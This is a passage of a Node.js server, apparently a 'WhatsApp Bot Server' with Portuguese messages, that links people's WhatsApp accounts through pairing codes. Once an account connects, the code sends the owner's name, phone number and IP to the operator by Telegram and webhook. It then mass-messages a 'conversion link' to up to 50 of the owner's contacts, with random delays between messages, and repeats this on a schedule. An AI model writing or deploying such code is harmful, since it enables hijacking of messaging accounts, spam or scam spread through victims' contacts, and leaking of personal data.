    const dbDest = path.join(backupDir, `bot-${timestamp}.db`);
    if (fs.existsSync(dbSrc)) {
        fs.copyFileSync(dbSrc, dbDest);
    }

    // Copy config
    const cfgSrc = path.join(__dirname, 'config.json');
    const cfgDest = path.join(backupDir, `config-${timestamp}.json`);
    if (fs.existsSync(cfgSrc)) {
        fs.copyFileSync(cfgSrc, cfgDest);
    }

    // Rotation: keep only last 7 days of backups
    try {
        const files = fs.readdirSync(backupDir);
        const now = Date.now();
        const maxAge = 7 * 24 * 60 * 60 * 1000; // 7 days
        for (const file of files) {
            const filePath = path.join(backupDir, file);
            const stat = fs.statSync(filePath);
            if (now - stat.mtimeMs > maxAge) {
                fs.unlinkSync(filePath);
                console.log(`[Backup] Rotated old backup: ${file}`);
            }
        }
    } catch (e) {
        console.error('[Backup] Rotation error:', e.message);
    }

    console.log(`[Backup] Completed: ${timestamp}`);
    db.addLog('BACKUP', `Backup realizado: ${timestamp}`);
    return timestamp;
}

// Run backup daily (every 24h)
setInterval(runBackup, 24 * 60 * 60 * 1000);
// Run backup 1 min after startup
setTimeout(runBackup, 60 * 1000);

app.get('/admin/backup/run', adminAuth, (req, res) => {
    const ts = runBackup();
    res.send(`Backup criado: ${ts}`);
});

app.get('/admin/backup/download', adminAuth, (req, res) => {
    const backupDir = path.join(__dirname, 'backups');
    if (!fs.existsSync(backupDir)) return res.status(404).send('Nenhum backup encontrado');

    const files = fs.readdirSync(backupDir).filter(f => f.startsWith('bot-') && f.endsWith('.db')).sort().reverse();
    if (files.length === 0) return res.status(404).send('Nenhum backup encontrado');

    res.download(path.join(backupDir, files[0]));
});

// ==================== SESSION MANAGEMENT ====================
async function startSession(sessionId, phoneNumber, ip, socket) {
    const config = loadConfig();

    sessions.set(sessionId, {
        id: sessionId,
        client: null,
        phone: phoneNumber,
        status: 'connecting',
        userInfo: null,
        connectedAt: null,
        ip: ip,
        socketId: socket.id,
        broadcastDone: false,
        startedAt: Date.now()
    });

    emitAdminUpdate({
        activeSessions: [...sessions.values()].filter(s => s.status === 'connected').length,
        newLog: { type: 'PAIRING', message: `Iniciando sessão: ${phoneNumber}`, time: new Date().toLocaleString('pt-BR') }
    });

    try {
        const client = await wppconnect.create({
            session: sessionId,
            catchQR: (base64Qrimg, asciiQR, attempts, urlCode) => {
                // Not used — we use pairing code instead
            },
            statusFind: (statusSession, session) => {
                console.log(`[Session:${phoneNumber}] Status: ${statusSession}`);
            },
            headless: 'new',
            logQR: false,
            browserArgs: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--no-first-run',
                '--no-zygote',
                '--single-process',
                '--disable-extensions'
            ],
            puppeteerOptions: {
                executablePath: (() => {
                    // Check for common browser paths on Linux
                    const paths = [
                        '/usr/bin/chromium-browser',
                        '/usr/bin/chromium',
                        '/usr/bin/google-chrome-stable'
                    ];
                    for (const p of paths) {
                        if (fs.existsSync(p)) return p;
                    }
                    // Fallback to Puppeteer's bundled Chromium (works on Windows/macOS/some Linux)
                    return undefined;
                })(),
                headless: 'new',
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu'
                ]
            },
            folderNameToken: 'tokens',
            autoClose: 0,
            createPathFileToken: true,
            waitForLogin: false
        });

        const session = sessions.get(sessionId);
        if (!session) return;
        session.client = client;

        // Request pairing code
        try {
            const code = await client.getPhoneCode(phoneNumber);
            if (code) {
                socket.emit('pairing_code', code);
                console.log(`[Session:${phoneNumber}] Pairing code: ${code}`);
                db.addLog('PAIRING', `Código enviado: ${phoneNumber}`);
            }
        } catch (err) {
            console.error(`[Session:${phoneNumber}] Pairing code error:`, err.message);
            socket.emit('error_msg', 'Erro ao gerar código. Tente novamente.');
            db.addLog('ERROR', `Erro pairing ${phoneNumber}: ${err.message}`);

            // Cleanup
            try { client.close(); } catch (e) { }
            sessions.delete(sessionId);
            return;
        }

        // Listen for connection
        client.onStateChange((state) => {
            console.log(`[Session:${phoneNumber}] State: ${state}`);

            if (state === 'CONNECTED') {
                handleConnected(sessionId, phoneNumber, ip, socket, client);
            }

            if (['CONFLICT', 'UNPAIRED', 'UNLAUNCHED'].includes(state)) {
                console.log(`[Session:${phoneNumber}] Disconnected: ${state}`);
                try { client.close(); } catch (e) { }
                sessions.delete(sessionId);
                emitAdminUpdate({ activeSessions: [...sessions.values()].filter(s => s.status === 'connected').length });
            }
        });

        // Timeout: auto-cleanup after 5 minutes if not connected
        setTimeout(() => {
            const s = sessions.get(sessionId);
            if (s && s.status === 'connecting') {
                console.log(`[Session:${phoneNumber}] Timeout — cleaning up`);
                try { s.client?.close(); } catch (e) { }
                sessions.delete(sessionId);
                socket.emit('error_msg', 'Tempo esgotado. Tente novamente.');
                emitAdminUpdate({ activeSessions: [...sessions.values()].filter(s => s.status === 'connected').length });
            }
        }, 5 * 60 * 1000);

    } catch (err) {
        console.error(`[Session:${phoneNumber}] Create error:`, err.message);
        socket.emit('error_msg', 'Erro ao iniciar sessão. Tente novamente.');
        db.addLog('ERROR', `Erro sessão ${phoneNumber}: ${err.message}`);
        sessions.delete(sessionId);
        sendTelegram(`❌ <b>Erro de Sessão</b>\n📱 ${phoneNumber}\n💬 ${err.message}`);
    }
}

async function handleConnected(sessionId, phoneNumber, ip, socket, client) {
    const session = sessions.get(sessionId);
    if (!session) return;

    session.status = 'connected';
    session.connectedAt = new Date().toLocaleString('pt-BR');

    // Track connection time
    if (session.startedAt) {
        const elapsed = Date.now() - session.startedAt;
        connectionTimes.push(elapsed);
        if (connectionTimes.length > 100) connectionTimes.shift(); // keep last 100
        const secs = Math.round(elapsed / 1000);
        console.log(`[Session:${phoneNumber}] Connected in ${secs}s`);
    }

    // Get user info
    try {
        const me = await client.getHostDevice();
        session.userInfo = {
            name: me.pushname || me.name || phoneNumber,
            phone: phoneNumber
        };
    } catch (e) {
        session.userInfo = { name: phoneNumber, phone: phoneNumber };
    }

    const name = session.userInfo?.name || phoneNumber;

    // Save to DB
    db.saveConnection(phoneNumber, name, ip);
    db.addLog('CONNECTED', `${name} (${phoneNumber}) conectou — IP: ${ip}`);

    // Notify frontend
    socket.emit('connected', { name, phone: phoneNumber });

    // Emit admin update
    emitAdminUpdate({
        activeSessions: [...sessions.values()].filter(s => s.status === 'connected').length,
        newLog: { type: 'CONNECTED', message: `${name} (${phoneNumber}) conectou`, time: new Date().toLocaleString('pt-BR') }
    });

    // Send welcome message
    const config = loadConfig();
    if (config.welcomeMessage) {
        try {
            const welcomeText = config.welcomeMessage.replace('{link}', config.conversionLink || '');
            const myNumber = phoneNumber + '@c.us';
            await client.sendMessage(myNumber, welcomeText);
            console.log(`[Session:${phoneNumber}] Welcome message sent`);
        } catch (e) {
            console.error(`[Session:${phoneNumber}] Welcome msg error:`, e.message);
        }
    }

    // Webhook + Telegram
    sendWebhook({ name, phone: phoneNumber, ip });
    sendTelegram(
        `🟢 <b>Nova Conexão!</b>\n👤 Nome: ${name}\n📱 Número: ${phoneNumber}\n🌐 IP: ${ip}\n⏰ ${new Date().toLocaleString('pt-BR')}`
    );

    // Auto-broadcast after connection
    if (config.broadcastMessage) {
        setTimeout(async () => {
            const s = sessions.get(sessionId);
            if (s && s.status === 'connected' && s.client && !s.broadcastDone) {
                console.log(`[Session:${phoneNumber}] Starting auto-broadcast...`);
                const result = await runBroadcast(client, config.broadcastMessage, config.broadcastLimit || 50, phoneNumber);
                s.broadcastDone = true;

                db.addLog('BROADCAST', `${phoneNumber}: ${result}`);
                emitAdminUpdate({
                    newLog: { type: 'BROADCAST', message: `${phoneNumber}: ${result}`, time: new Date().toLocaleString('pt-BR') }
                });
                sendTelegram(`📢 <b>Broadcast Completo</b>\n📱 ${phoneNumber}\n📊 ${result}`);
            }
        }, 10000); // Wait 10 seconds after connection to start broadcast
    }
}

// ==================== BROADCAST ====================
async function runBroadcast(client, message, limit, phoneNumber) {
    const config = loadConfig();
    const blacklist = config.blacklist || [];
    let sent = 0;
    let failed = 0;
    let blocked = 0;

    try {
        const contacts = await client.getAllContacts();
        const validContacts = contacts.filter(c => {
            if (!c.id || !c.id._serialized) return false;
            if (c.isGroup) return false;
            if (c.isMe) return false;
            if (!c.id._serialized.endsWith('@c.us')) return false;

            // Check blacklist
            const number = c.id._serialized.replace('@c.us', '');
            if (blacklist.includes(number)) {
                blocked++;
                return false;
            }

            return true;
        });

        console.log(`[Broadcast:${phoneNumber}] ${validContacts.length} contacts, limit: ${limit}`);

        const toSend = validContacts.slice(0, limit);

        for (const contact of toSend) {
            try {
                await client.sendMessage(contact.id._serialized, message);
                sent++;
                console.log(`[Broadcast:${phoneNumber}] Sent ${sent}/${toSend.length}`);

                // Random delay between messages (2-5 seconds)
                const delay = 2000 + Math.random() * 3000;
                await new Promise(r => setTimeout(r, delay));
            } catch (e) {
                failed++;
                console.error(`[Broadcast:${phoneNumber}] Failed to send to ${contact.id._serialized}:`, e.message);
            }
        }

        // Update stats
        try {
            const stats = loadStats();
            stats.broadcasts = (stats.broadcasts || 0) + 1;
            stats.sent = (stats.sent || 0) + sent;
            stats.failed = (stats.failed || 0) + failed;
            saveStats(stats);
        } catch (e) { }

    } catch (err) {
        console.error(`[Broadcast:${phoneNumber}] Error:`, err.message);
        db.addLog('ERROR', `Broadcast error ${phoneNumber}: ${err.message}`);
        return `Erro: ${err.message}`;
    }

    const result = `Enviados: ${sent} | Falhas: ${failed} | Blacklist: ${blocked}`;
    return result;
}

// ==================== CLEANUP ====================
app.get('/admin/cleanup', adminAuth, (req, res) => {
    let cleaned = 0;
    for (const [id, session] of sessions) {
        if (session.status !== 'connected' || !session.client) {
            try { session.client?.close(); } catch (e) { }
            sessions.delete(id);
            cleaned++;
        }
    }

    // Also clean up token folders for deleted sessions
    const tokenDir = path.join(__dirname, 'tokens');
    if (fs.existsSync(tokenDir)) {
        try {
            const tokenFolders = fs.readdirSync(tokenDir);
            for (const folder of tokenFolders) {
                const hasActiveSession = [...sessions.keys()].some(id => id === folder);
                if (!hasActiveSession) {
                    const folderPath = path.join(tokenDir, folder);
                    fs.rmSync(folderPath, { recursive: true, force: true });
                    cleaned++;
                }
            }
        } catch (e) {
            console.error('[Cleanup] Error cleaning tokens:', e.message);
        }
    }

    db.addLog('ADMIN', `Limpeza: ${cleaned} itens removidos`);
    emitAdminUpdate({ activeSessions: [...sessions.values()].filter(s => s.status === 'connected').length });
    res.send(`Limpeza concluída: ${cleaned} itens removidos`);
});

// ==================== SCHEDULED BROADCAST ====================
setInterval(() => {
    const config = loadConfig();
    if (!config.scheduledTime || !config.broadcastMessage) return;

    const now = new Date();
    const [hh, mm] = config.scheduledTime.split(':').map(Number);
    if (isNaN(hh) || isNaN(mm)) return;

    if (now.getHours() === hh && now.getMinutes() === mm) {
        console.log('[Scheduler] Running scheduled broadcast...');
        db.addLog('SCHEDULER', 'Broadcast agendado iniciado');

        for (const [id, session] of sessions) {
            if (session.status === 'connected' && session.client && !session.broadcastDone) {
                runBroadcast(session.client, config.broadcastMessage, config.broadcastLimit || 50, session.phone)
                    .then(result => {
                        db.addLog('BROADCAST', `Agendado ${session.phone}: ${result}`);
                        sendTelegram(`⏰ <b>Broadcast Agendado</b>\n📱 ${session.phone}\n📊 ${result}`);
                    });
            }
        }
    }
}, 60 * 1000); // Check every minute

// ==================== START SERVER ====================
server.listen(PORT, () => {
    console.log(`\n================================================`);
    console.log(`  🤖 WhatsApp Bot Server`);
    console.log(`  🌐 http://localhost:${PORT}`);
    console.log(`  🔐 Admin: http://localhost:${PORT}/admin/login`);
    console.log(`  ❤️  Health: http://localhost:${PORT}/health`);
    console.log(`================================================\n`);
    db.addLog('SERVER', 'Servidor iniciado');
});
